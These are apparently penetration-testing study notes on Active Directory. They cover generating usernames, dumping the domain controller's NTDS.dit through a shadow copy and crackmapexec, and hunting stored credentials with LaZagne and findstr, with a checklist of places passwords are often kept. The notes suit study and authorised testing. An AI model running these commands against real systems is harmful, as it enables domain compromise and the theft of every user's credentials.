## Active Directory

List of employees:

    Ben Williamson
    Bob Burgerstien
    Jim Stevenson
    Jill Johnson
    Jane Doe

We can use `Username Anarchy` to generate a username list:

## Capturing NTDS.dit

- Connect to the DC with Evil-WinRM
- Check localgroup membership
```
    net localgroup
    net user billybobjoel
```

If we have administrative rights, we can move along.

- Creating a shadow copy of C:
```
    vssadmin CREATE SHADOW /for=C:
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\NTDS.dit
```

Easier way with crackmapexec:
```bash
crackmapexec smb 10.10.100.103 -u johnjohnson -p 'P@ssword123!' --ntds
```

## Credential Hunting in Windows

Once we have access to the target, we can continue to search for other credentials:
`Lazagne` is a thrid-party application used to find weakly stored application passwords.
```
C:\Users\Bob\Desktop> start lazagne.exe all
```

Using `findstr`:
```
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

## Aditional Considerations

Here are some other places we should keep in mind when credential hunting:

    - Passwords in Group Policy in the SYSVOL share
    - Passwords in scripts in the SYSVOL share
    - Password in scripts on IT shares
    - Passwords in web.config files on dev machines and IT shares
    - unattend.xml
    - Passwords in the AD user or computer description fields
    - KeePass databases --> pull hash, crack and get loads of access.
    - Found on user systems and shares
    - Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, 
    shares, Sharepoint
